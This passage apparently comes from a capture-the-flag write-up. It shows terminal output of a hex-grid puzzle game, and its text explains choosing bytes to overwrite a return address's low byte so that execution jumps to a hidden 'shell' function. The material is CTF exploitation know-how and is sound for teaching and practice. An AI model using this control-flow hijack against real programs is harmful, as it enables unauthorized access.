⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                      ┌───┐                    
                                                 ─────�\x94\xa4   ├──7F───5A───7F───55─
                                                      └───┘                    
                                                                               
                                                             0B   5A   7E   0A 


​                                                                               
                                                                  10        55 


​                                                                               
                                                   13   10        FE        44 


​                                                                               
                                                   7F   0A   FE   F8           


​                                                                               
                                                             13   0B           
                                                                               
                                                            $> 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                           ┌───┐               
                                                 ──────────┤#7F├──5A───7F───55─
                                                           └───┘               
                                                                               
                                                             0B   5A   7E   0A 


​                                                                               
                                                                  10        55 


​                                                                               
                                                   13   10        FE        44 


​                                                                               
                                                   7F   0A   FE   F8           


​                                                                               
                                                             13   0B           

```

16 values are selected, we're currently pointing to the LSB of the return address and are in a good line.

We now just have to select `0x5A` and `0xB`, which will make return address point to the `shell` function and quit the application.

```

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀�\xa0\x80⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                ┌───┐          
                                                 ────────────7F─┤#5A├──7F───55─
                                                                └───┘          
                                                                               
                                                             0B   5A   7E   0A 


​                                                                               
                                                                  10        55 


​                                                                               
                                                   13   10        FE        44 


​                                                                               
                                                   7F   0A   FE   F8           


​                                                                               
                                                             13   0B           
                                                                               
                                                            $> $  
$  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
